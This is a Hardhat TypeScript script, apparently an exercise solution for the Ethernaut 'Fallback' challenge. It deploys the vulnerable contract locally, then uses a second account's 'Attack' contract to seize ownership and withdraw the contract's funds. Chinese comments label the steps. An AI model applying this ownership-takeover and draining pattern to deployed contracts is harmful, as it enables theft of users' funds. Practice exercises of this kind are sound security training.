import { ethers } from "hardhat";
import colors from "colors";
colors;
import { formatEther, parseEther } from "ethers/lib/utils";
import { Contract } from "ethers";
const NAME = "Fallback"


const main = async () => {
    const FallBack = await ethers.getContractFactory(NAME);
    const fallback = await FallBack.deploy();
    await fallback.deployed();
    console.log(`fallback contract owner： ${await fallback.owner()}`.green);
    // forAttact(fallback);
    fallbackAttack(fallback)

}

const forAttact = async (fallback: Contract) => {
    const [acc1, acc2] = await ethers.getSigners();
    console.log(`acc2 balance ${formatEther(await acc2.getBalance())}`.yellow);

    // 获取合约中的额度 10 / 0.09 = 1111
    console.log("1.计算需要多少ETH".red)
    const acc1Balance = await fallback.contributions(acc1.address);
    const value = parseEther("0.09");
    const forTotal = acc1Balance.div(value)
    console.log(forTotal);

    console.log("2.部署攻击合约".red)
    const Attack = await ethers.getContractFactory("Attack", acc2);
    const attack = await Attack.deploy(fallback.address);
    await attack.deployed();
    console.log(`attack address:${attack.address}`.green);

    console.log("3.开始攻击".red)
    await attack.fallbackContributes(forTotal.add("1"), { value: acc1Balance.add(value) });
    console.log(`fallback contract owner： ${await fallback.owner()}`.green);

    console.log("4.取款".red)
    await attack.fallbackWithdraw();
    await attack.withdraw();

    console.log(`acc2 balance ${formatEther(await acc2.getBalance())}`.yellow);
    console.log("4.完成".red)
}

const fallbackAttack = async (fallback:Contract) => {
    const [acc1, acc2] = await ethers.getSigners();
    const Attack = await ethers.getContractFactory("Attack", acc2);
    const attack = await Attack.deploy(fallback.address);
    await attack.deployed();
    console.log(`accack address ${attack.address}`.yellow);

    await attack.fallbackContribute({value: parseEther("0.1")});
    console.log(`fallback contract owner： ${await fallback.owner()}`.green);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

